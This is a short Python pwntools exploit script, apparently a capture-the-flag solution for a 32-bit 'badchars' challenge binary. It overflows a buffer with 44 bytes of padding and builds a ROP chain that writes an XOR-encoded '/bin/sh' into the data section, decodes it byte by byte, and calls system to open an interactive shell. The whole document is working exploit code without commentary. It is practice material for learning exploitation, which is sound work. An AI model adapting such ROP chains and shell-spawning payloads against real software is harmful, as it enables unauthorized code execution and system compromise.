from pwn import *
context.log_level = 'debug'

p="./elf"

badchar=[0x62,0x69,0x63,0x2f,0x20,0x66,0x6e,0x73]
patchbyte=0x1

mov_data=0x08048893
pop_esi_edi=0x08048899
xor_ebx_cl=0x08048890 
sys_plt=0x080484E0
data_addr=0x0804A038
pop_ebx_ecx=0x08048896

while(1):
    binsh=""
    for i in "/bin/sh\x00":
        onestr=ord(i)^patchbyte
        if onestr in badchar:
            patchbyte+=1
            break
        else:
            binsh+=chr(onestr)
    if len(binsh)==8:
        break


context.binary=p
io=process(p)

payload="a"*44+p32(pop_esi_edi)+binsh[:4]+p32(data_addr)+p32(mov_data)
payload+=p32(pop_esi_edi)+binsh[4:8]+p32(data_addr+4)+p32(mov_data)

for i in range(len(binsh)):
    payload+=p32(pop_ebx_ecx)
    payload+=p32(data_addr+i)
    payload+=p32(patchbyte)
    payload+=p32(xor_ebx_cl)

payload+=p32(sys_plt)+p32(0xdeadbeef)+p32(data_addr)

io.recvuntil("> ")
io.sendline(payload)

io.interactive()
